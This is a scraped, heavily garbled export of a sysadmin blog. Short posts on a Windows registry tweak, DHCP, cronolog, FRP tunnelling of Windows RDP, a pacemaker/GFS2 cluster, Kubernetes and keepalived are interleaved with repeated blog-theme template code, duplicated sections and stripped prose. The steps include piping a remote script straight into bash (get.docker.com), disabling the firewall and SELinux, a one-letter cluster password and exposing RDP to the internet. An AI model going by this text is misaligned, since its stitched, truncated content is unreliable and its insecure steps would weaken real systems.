        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

Post.title: Win11Win10
Post._content:
Win11Win11

### Win10

<kbd>Win</kbd>+<kbd>R</kbd>`cmd`

<!-- more -->

```bash
reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f /ve
```

```bash
taskkill /f /im explorer.exe & start explorer.exe
```

### Win11

Win10Win11<kbd>Win</kbd>+<kbd>R</kbd>`cmd`

```bash
reg delete "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}" /f
```

```bash
taskkill /f /im explorer.exe & start explorer.exe
```

Post.title: LinuxDHCP
Post._content:
DHCPDHCP

### DHCP

1. 

```bash
yum install -y dhcp-server
```

Centos8DHCPdhcp-serverdhcp-client

<!-- more -->

2. 

dhcp`/etc/dhcp/dhcpd.conf`dhcp`/usr/share/doc/dhcp-server/dhcpd.conf.example`



```bash
egrep -v "^#|^$" /usr/share/doc/dhcp-server/dhcpd.conf.example > /etc/dhcp/dhcpd.conf
```

3. 

```bash
# 
option domain-name "blog.nustarain.com";
# 
option domain-name-servers ns1.nustarain.com;
# 
default-lease-time 600;
# 
max-lease-time 7200;
log-facility local7;
# 10.8.7.0255.255.255.0
subnet 10.8.7.0 netmask 255.255.255.0 {
  # IP
  range 10.8.7.10 10.8.7.253;
  # 
  option routers 10.8.7.254;
  # 
  option broadcast-address 10.8.7.255;
  default-lease-time 600;
  max-lease-time 7200;
}
# IPIPhost 
host fantasia {
  # MAC
  hardware ethernet 00:0c:29:af:33:58;
  # IP
  fixed-address 10.8.7.68;
}
```

DHCPDHCP
`dhcpd -t`

```bash
Internet Systems Consortium DHCP Server 4.3.6
Copyright 2004-2017 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/
ldap_gssapi_principal is not set,GSSAPI Authentication for LDAP will not be used
Not searching LDAP since ldap-server, ldap-port and ldap-base-dn were not specified in the config file
Config file: /etc/dhcp/dhcpd.conf
Database file: /var/lib/dhcpd/dhcpd.leases
PID file: /var/run/dhcpd.pid
Source compiled to use binary-leases
```

Please rememberPractice makes perfect.

### IP



1. 

```bash
yum install -y dhcp-client
```

2. `/etc/sysconfig/network-scripts/ifcfg-ens160``BOOTPROTO=dhcp`

3. 

```bash
systemctl restart NetworkManager
nmcli c d ens160
nmcli c up ens160
```

4. 

```bash
dhclient ens160    # IP
dhclient -r ens160    # IP
```

### 



* ****

* **** log rotation

* ****

###  cronolog 

1. 

```bash
wget https://files.cnblogs.com/files/crazyzero/cronolog-1.6.2.tar.gz
```

2. 

```bash
tar -zxvf cronolog-1.6.2.tar.gz
cd cronolog-1.6.2/
```

3. 

```bash
./configure 
make
make install
```

4. 

```bash
[root@VM-0-10-centos sbin]# which cronolog
/usr/local/sbin/cronolog
```

### 

 Apache  Apache `ErrorLog``CustomLog`

* `ErrorLog "logs/error_log"`

```bash
ErrorLog "|/usr/local/sbin/cronolog logs/error_%Y%m%d.log"
```



![ErrorLog](./cronolog/1.png)

* `CustomLog "logs/access_log" combined`

```bash
CustomLog "|/usr/local/sbin/cronolog logs/access_%Y%m%d.log" combined
```

### 

`httpd -t` Apache `apachectl graceful`

`/var/log/httpd` error_20231210.log  log  curl  access_20231210.log 

![ErrorLog](./cronolog/3.png)

      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;

        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {

        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

Post.title: FRP Windows
Post._content:
VPSVPSVPS To Desk  FRP 

<!-- more -->

### 

FRP  VPS 

Github[ https://github.com/fatedier/frp](https://github.com/fatedier/frp)

###  FRP



```bash
wget https://github.com/fatedier/frp/releases/download/v0.15.1/frp_0.15.1_linux_amd64.tar.gz
```


![](./frp/1.png)

* frpc VPS
* frpc.toml VPS
* frps VPS
* frps.toml VPS

### frps.toml

```toml
bindPort = 7000
```

![](./frp/4.png)]



```bash
frps -c ./frps.toml
```

<kbd>Ctrl</kbd> + <kbd>C</kbd>

Github0.53.00.53.0[****](https://pan.baidu.com/s/1eTxV0C_ApwfWivirMB6zIg?pwd=wzns) wzns

###  systemctl  FRP 

[****](https://gofrp.org/zh-cn/docs/setup/systemd/)

1.  systemd

 Linux  systemd yum CentOS/RHEL apt Debian/Ubuntu

```bash
#  yum  systemdCentOS/RHEL
yum install systemd

#  apt  systemdDebian/Ubuntu
apt install systemd
```

2. frps.service 

 ( vim)  /etc/systemd/system  frps.service  frps 

```bash
sudo vim /etc/systemd/system/frps.service
```

3. 

```bash
[Unit]
# 
Description = frp server
After = network.target syslog.target
Wants = network.target

[Service]
Type = simple
# frpsfrps
ExecStart = /path/to/frps -c /path/to/frps.toml

[Install]
WantedBy = multi-user.target
```

4. systemctlfrps

```bash
# frp
sudo systemctl start frps
# frp
sudo systemctl stop frps
# frp
sudo systemctl restart frps
# frp
sudo systemctl status frps
```

### WindowsFRP

[0.53.0Windows](https://github.com/fatedier/frp/releases/download/v0.53.0/frp_0.53.0_windows_amd64.zip)   
Github[****](https://pan.baidu.com/s/11-wDw4l_augPWeAf9OcTGA?pwd=kstm) kstm

### 



![](./frp/2.png)

```toml
serverAddr = "123.56.10.1"  # VPS
serverPort = 7000           # 

[[proxies]]
name = "HP-desktop"         # 
type = "tcp"                # 
localIP = "127.0.0.1"       # 
localPort = 3389            # 
remotePort = 10086          # 10086Windows123.56.10.1:10086
```

CMD **frpc** 

![](./frp/3.png)

### Windows

.vbs


    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"
    list-folded="{{aplayer.listfolded}}"
    list-max-height="{{aplayer.listmaxheight}}"
    storage-name="{{aplayer.storagename}}" >
  </meting-js>
{% endif %}
data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

Post.title: Linuxiscsi+pacemaker+CLVM+gfs
Post._content:
### 

|||||IP|
|:-:|:-:|:-:|:-:|:-:|
|web3|web|ens224||10.8.7.82/24|
|web4|web|ens224||10.8.7.83/24|
|storage1|iscsi|ens224||10.8.7.41/24|
|storage2|iscsi|ens224||10.8.7.42/24|

### 



1. gfs1gfs2ISCSIweb1web2

<!-- more -->

2. web1web2

3. GFS

4. 

5. CLVM

6. 

### 

* Centos7Centos8

* SELINUX

* 

* NetworkManager

* `/etc/hosts`

```bash
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
10.8.7.82   web3.liuxp.com
10.8.7.83   web4.liuxp.com
10.8.7.41   storage1.liuxp.com
10.8.7.42   storage2.liuxp.com
```

scp

```bash
scp /etc/hosts 10.8.7.42:/etc/
```

### 

* 

* ISCSI[ISCSI](https://nustarain.gitee.io/2023/07/04/ISCSI/)ISCSIwebstorage1ISCSIweb`/dev/sdb`storage2ISCSIweb`/dev/sdc`

* web3web4web3web4

* 

```bash
yum -y install pacemaker pcs
systemctl start pcsd
systemctl enable pcsd
echo "q" | passwd --stdin hacluster
```

pcsd`hacluster`

* 

web3web4web4web3

```bash
ssh-keygen
ssh-copy-id -i /root/.ssh/id_rsa.pub web4.liuxp.com
```

web3

* 

```bash 
pcs cluster auth web3.liuxp.com web4.liuxp.com
Username: hacluster
Password:q
node3: Authorized
node4: Authorized
pcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com
pcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com --force # 
pcs cluster start
pcs cluster status
pcs cluster enable --all
pcs status corosync
```

`--force`success



```bash
pcs cluster destroy
```

* GFS

```bash
yum install -y lvm2-cluster gfs2-utils fence-agents-all
lvmconf --enable-cluster
modprobe gfs2
lsmod | grep gfs2 
```

GFS

* 

```bash
pcs property set no-quorum-policy=ignore
pcs property set stonith-enabled=false

pcs resource create dlm ocf:pacemaker:controld allow_stonith_disabled=true op monitor interval=30s clone interleave=true ordered=true

pcs resource create clvmd ocf:heartbeat:clvm op monitor interval=30s clone interleave=true ordered=true

pcs constraint order start dlm-clone then clvmd-clone
pcs constraint colocation add clvmd-clone with dlm-clone
pcs property set no-quorum-policy=freeze
```

<kbd>Ctrl</kbd>+<kbd>C</kbd><kbd>Ctrl</kbd>+<kbd>V</kbd>

* CLVM

```bash
pvcreate /dev/sdb
pvcreate /dev/sdc
vgcreate -cy qavg /dev/sdb /dev/sdc
lvcreate -L 12G -n qa qavg
```

[LVM](https://nustarain.gitee.io/2023/07/04/LVM/)

* 

```bash 
# 
mkfs.gfs2 -p lock_dlm -t nginx_cluster:gfs2 -j 2 /dev/qavg/qa
# 
mkdir /mnt/cluster
# 
pcs resource create fs_gfs2 Filesystem device="/dev/qavg/qa" directory="/mnt/cluster" fstype="gfs2" options="noatime,nodiratime" op monitor interval=10s clone interleave=true

# 
pcs constraint order start clvmd-clone then fs_gfs2-clone
pcs constraint colocation add fs_gfs2-clone with clvmd-clone
pcs constraint show
df
```

`df``/dev/qavg/qa`

```bash
pcs constraint colocation add clvmd-clone with dlm-clone
pcs property set no-quorum-policy=freeze
```

<kbd>Ctrl</kbd>+<kbd>C</kbd><kbd>Ctrl</kbd>+<kbd>V</kbd>

* CLVM

```bash
pvcreate /dev/sdb
pvcreate /dev/sdc
vgcreate -cy qavg /dev/sdb /dev/sdc
lvcreate -L 12G -n qa qavg
```

[LVM](https://nustarain.gitee.io/2023/07/04/LVM/)

* 

```bash 
# 
mkfs.gfs2 -p lock_dlm -t nginx_cluster:gfs2 -j 2 /dev/qavg/qa
# 
mkdir /mnt/cluster
# 
pcs resource create fs_gfs2 Filesystem device="/dev/qavg/qa" directory="/mnt/cluster" fstype="gfs2" options="noatime,nodiratime" op monitor interval=10s clone interleave=true

# 
pcs constraint order start clvmd-clone then fs_gfs2-clone
pcs constraint colocation add fs_gfs2-clone with clvmd-clone
pcs constraint show
df
```

`df``/dev/qavg/qa`

{% if aplayer.enabled %}
  <!-- require APlayer -->
  <link rel="stylesheet" href="{{aplayer.cdn.css}}">
  <script src="{{aplayer.cdn.js}}"></script>
  <!-- require MetingJS -->
  <script src="{{aplayer.cdn.meting}}"></script>
  <meting-js
    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"
    list-folded="{{aplayer.listfolded}}"
    list-max-height="{{aplayer.listmaxheight}}"
    storage-name="{{aplayer.storagename}}" >
  </meting-js>
{% endif %}
data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

{% if aplayer.enabled %}
  <!-- require APlayer -->
  <link rel="stylesheet" href="{{aplayer.cdn.css}}">
  <script src="{{aplayer.cdn.js}}"></script>
  <!-- require MetingJS -->
  <script src="{{aplayer.cdn.meting}}"></script>
  <meting-js
    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"
    list-folded="{{aplayer.listfolded}}"
    list-max-height="{{aplayer.listmaxheight}}"
    storage-name="{{aplayer.storagename}}" >
  </meting-js>
{% endif %}
data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

![](./gitalk-comment/3.png)

github-->setting-->Developer Settings-->OAuth Apps

### 

`vim themes/next/_config.yml`

1. `active`gitalk

```bash 
comments:
  # Available values: tabs | buttons
  style: tabs
  # Choose a comment system to be displayed by default.
  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances
  active: gitalk
  # Setting `true` means remembering the comment system selected by the visitor.
  storage: true
  # Lazyload all comment systems.
  lazyload: false
  # Modify texts or order for any naves, here are some examples.
  nav:
    #disqus:
    #  text: Load Disqus
    #  order: -1
    #gitalk:
    #  order: -2
```

2. gitalk

  * enabletrue
  * github_idgithub
  * repo
  * client_idID
  * client_secret
  * admin_usergithub
  * distraction_free_mode
  * proxy
  * language

```bash 
gitalk:
  enable: true
  github_id: lxp731 # GitHub repo owner
  repo: hexo-comment # Repository name to store issues
  client_id: b771bc******0002c29 # GitHub Application Client ID
  client_secret: e87e6******531007231*******5ab3c131d3aa1 # GitHub Application Client Secret
  admin_user: lxp731 # GitHub repo owner and collaborators, only these guys can initialize gitHub issues
  distraction_free_mode: true # Facebook-like distraction free mode
  # When the official proxy is not available, you can change it to your own proxy address
  proxy: https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token # This is official proxy address
  # Gitalk's display language depends on user's browser or system environment
  # If you want everyone visiting your site to see a uniform language, you can set a force language value
  # Available values: en | es-ES | fr | ru | zh-CN | zh-TW
  language: zh-CN
  ```

data.APlayer:
{% if aplayer.enabled %}
  <!-- require APlayer -->
  <link rel="stylesheet" href="{{aplayer.cdn.css}}">
  <script src="{{aplayer.cdn.js}}"></script>
  <!-- require MetingJS -->
  <script src="{{aplayer.cdn.meting}}"></script>
  <meting-js
    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"
    list-folded="{{aplayer.listfolded}}"
    list-max-height="{{aplayer.listmaxheight}}"
    storage-name="{{aplayer.storagename}}" >
  </meting-js>
{% endif %}
data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

Post.title: K8S
Post._content:
K8S

### 

1. CentOS Stream release 8
<!--more-->
2. K8S v1.23.6
3. Docker version 26.0.0, build 2ae903e

||IP|CPU||
|:---:|:---:|:---:|:---:|
|k8s-mst|192.168.229.130|4|8G|
|k8s-nd1|192.168.229.131|4|4G|
|k8s-nd2|192.168.229.132|4|4G|

### 

> 2.1-2.82.9-2.10master2.112.12-2.14master

#### 

selinuxswap

```bash
systemctl stop firewalld && systemctl disable firewalld && iptables -F
sed -i 's/enforcing/disabled/' /etc/selinux/config && setenforce 0
swapoff -a
sed -ri 's/.*swap.*/#&/' /etc/fstab
```

#### 

```bash
hostnamectl set-hostname k8s-mst
hostnamectl set-hostname k8s-nd1
hostnamectl set-hostname k8s-nd2
```

#### hosts

```bash
192.168.229.130 k8s-mst
192.168.229.131 k8s-nd1
192.168.229.132 k8s-nd2
```

 `scp`  `/etc/hosts` 

```bash
scp /etc/hosts k8s-nd1:/etc/hosts
```

#### 

```bash
cat > /etc/sysctl.d/k8s.conf << EOF
net.bridge.bridge-nf-call-ip6tables = 1
net.bridge.bridge-nf-call-iptables = 1
net.ipv4.ip_forward = 1
EOF

sysctl --system
```

#### [Docker](https://nustarain.gitee.io/2023/10/30/DockerInit)

```bash
curl -fsSL https://get.docker.com | bash -s docker
```

K8SDockerdaemon.json

```bash
cat > /etc/docker/daemon.json << EOF
{
"registry-mirrors": ["https://gqs7xcfd.mirror.aliyuncs.com","https://hub-mirror.c.163.com"],
"exec-opts": ["native.cgroupdriver=systemd"],
"log-driver": "json-file",
"log-opts": {
"max-size": "100m"
},
"storage-driver": "overlay2"
}
EOF
```

Docker

```bash
systemctl daemon-reload && systemctl enable --now docker
```

#### K8Syum

K8Syum

```bash
cat > /etc/yum.repos.d/kubernetes.repo << EOF
[kubernetes]
name=Kubernetes
baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/
enabled=1
gpgcheck=1
repo_gpgcheck=1
gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg
EOF
```

#### K8S

1.24.X Docker1.23.X

```bash
yum install -y kubelet-1.23.6 kubeadm-1.23.6 kubectl-1.23.6
```

#### K8S

```bash
systemctl enable --now kubelet
```

#### K8S

```bash
kubeadm init \
--kubernetes-version 1.23.6 \
--apiserver-advertise-address=192.168.229.130 \
--service-cidr=10.96.0.0/12 \
--pod-network-cidr=10.244.0.0/16 \
--image-repository registry.aliyuncs.com/google_containers
```

- kubernetes-version 
- apiserver-advertise-address APIk8s
- service-cidr 
- pod-network-cidr Pod

    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"

data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

#### keepalived

```
cp /etc/keepalived/keepalived.conf{,.bak}
```

3. /etc/keepalived/keepalived.conf

|     | route_id  | vrrp_instance | state  | interface | virtual_router_id | priority | virtual_ipaddress |
| :-------: | :-------: | :-----------: | :----: | :-------: | :---------------: | :------: | :---------------: |
| mariadb-1 | db_master |  mariadb-ha   | BACKUP |  ens224   |        60         |   100    |  172.21.8.33/24   |
| mariadb-2 | db_slave  |  mariadb-ha   | BACKUP |  ens224   |        60         |    90    |  172.21.8.34/24   |

* mariadb-1 `/etc/keepalived/keepalived.conf`  



```bash 
! Configuration File for keepalived

global_defs {
   notification_email {
     liuxp731@qq.com	# 
   }
   notification_email_from Alexandre.Cassen@firewall.loc
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id db_master	# 
   vrrp_skip_check_adv_addr
   vrrp_strict
   vrrp_garp_interval 0
   vrrp_gna_interval 0
}
```

 vrrp_script   mariadb 

```bash
vrrp_script check_mariadb {
   script "/etc/keepalived/checkmariadb.sh"
   interval 2
}
```

VRRPD   

```bash 
vrrp_instance mariadb-ha {
    state BACKUP	# 
    interface ens224
    nopreempt		# 
    virtual_router_id 60
    priority 100	# 
    advert_int 1
    authentication {
        auth_type PASS
```

    server="{{aplayer.server}}"

    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"

    theme="{{aplayer.theme}}"

data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

{% if aplayer.enabled %}
  <!-- require APlayer -->
  <link rel="stylesheet" href="{{aplayer.cdn.css}}">
  <script src="{{aplayer.cdn.js}}"></script>
  <!-- require MetingJS -->
  <script src="{{aplayer.cdn.meting}}"></script>
  <meting-js
    server="{{aplayer.server}}"
    type="{{aplayer.type}}"
    fixed="{{aplayer.fixed}}"
    id="{{aplayer.id}}"
    auto="{{aplayer.auto}}"
    mini="{{aplayer.mini}}"
    autoplay="{{aplayer.autoplay}}"
    theme="{{aplayer.theme}}"
    loop="{{aplayer.loop}}"
    order="{{aplayer.order}}"
    preload="{{aplayer.preload}}"
    volume="{{aplayer.volume}}"
    mutex="{{aplayer.mutex}}"
    list-folded="{{aplayer.listfolded}}"
    list-max-height="{{aplayer.listmaxheight}}"
    storage-name="{{aplayer.storagename}}" >
  </meting-js>
{% endif %}
data.body-end:
<script>
  document.addEventListener("DOMContentLoaded", function() {
    //  div.table-container 
    const tableContainers = document.querySelectorAll(".table-container");

    //  div.table-container 
    tableContainers.forEach(function(tableContainer) {
      //  div.table-container  span 
      const spanCount = tableContainer.querySelectorAll("tbody > tr > td.code > pre > span").length;

      //  span  >= 3
      if (spanCount >= 11) {
        //  div.table-container  figcaption 
        const prevElement = tableContainer.previousElementSibling;
        let figcaption;
        let iElement;
        if (!prevElement || prevElement.tagName.toLowerCase() !== "figcaption") {
          //  div.table-container  figcaption 
          figcaption = document.createElement("figcaption");

          //  figcaption  DOM 
          tableContainer.parentNode.insertBefore(figcaption, tableContainer);
        } else {
          figcaption = prevElement;
        }

        //  <i> 
        iElement = document.createElement("i");
        iElement.className = "fas fa-angle-down";
        // 
        iElement.innerHTML = "   ";
        figcaption.insertBefore(iElement, figcaption.firstChild);

        //  <i> 
        iElement.addEventListener("click", function() {
          //  tableContainer  "code-hidden" 
          tableContainer.classList.toggle("code-hidden");

          //  <i> 
          if (iElement.classList.contains("fa-angle-down")) {
            iElement.classList.remove("fa-angle-down");
            iElement.classList.add("fa-angle-right");
          } else {
            iElement.classList.remove("fa-angle-right");
            iElement.classList.add("fa-angle-down");
          }
        });
      }
    });
  });
</script>

```bash
systemctl start nfs-server
```

```bash
exportfs -rv
```

```bash
mkdir /www

```

{% if aplayer.enabled %}
  <!-- require APlayer -->
  <link rel="stylesheet" href="{{aplayer.cdn.css}}">
  <script src="{{aplayer.cdn.js}}"></script>
  <!-- require MetingJS -->
